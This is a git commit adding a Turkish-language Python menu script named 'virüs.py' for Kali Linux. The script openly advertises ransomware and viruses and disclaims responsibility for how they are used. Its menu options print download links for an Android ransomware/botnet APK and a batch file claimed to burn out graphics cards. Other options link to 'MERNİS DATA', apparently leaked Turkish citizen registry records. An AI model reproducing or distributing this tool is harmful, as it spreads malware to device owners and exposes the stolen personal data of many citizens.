a70f5f23fdb969acd6c393ca29ff0e55be556cfa
Swoyzi <103384233+swoyzi@users.noreply.github.com>
2022-08-16 22:48:53 +0300

    Add files via upload

---
+++ virüs.py
@@ -0,0 +1,58 @@
+import os
+
+while True:
+
+    
+    os.system("clear")
+
+    print(""""
+
+                                                                    bu tool swoyzi tarafından yapılmıştır 
+                                                                    kalı lınux icindir 
+                                                                     fidye virüsleri veya virüsler bu tooldadır 
+                                                                    not sorumluluk kulanan kişiye agitir 
+
+""")   
+    print('''
+01) basit fidye virüsü (android)
+
+
+
+02)ekrankartı yakan bat 
+
+03)MERNİS DATA KURULUM
+
+04)MERNİS DATA 
+q)quit
+
+''')
+
+    islemno = input ("secim yapın:")
+    if islemno == "02":
+     input("https://www.mediafire.com/file/1vol9ipgppsrmb5/stamkey.bat/file")
+
+    elif islemno == "2":   
+        input("hatalı secim devam etmek icin entere bas ")
+
+    if islemno == "01":
+        input("https://www.mediafire.com/file/cxjxp9z9gkh7eh5/androidbotnet.apk/file")
+
+    elif islemno == "1":   
+        input ("hatalı secim devam etmek icin entere bas ")
+   
+    if islemno == "3":
+        input("https://ay.live/j0gCD")
+
+    elif islemno == "3":   
+         input ("hatalı secim devam etmek icin entere bas ")
+    elif islemno == "":   
+        input ("hatalı secim devam etmek icin entere bas ")
+
+    if islemno ==  "04":
+        input ("https://ay.live/j0gCD")
+
+    elif islemno == "4":   
+        input ("hatalı secim devam etmek icin entere bas ")
+
+    elif islemno == "q" or islemno == "Q":
+                 quit()
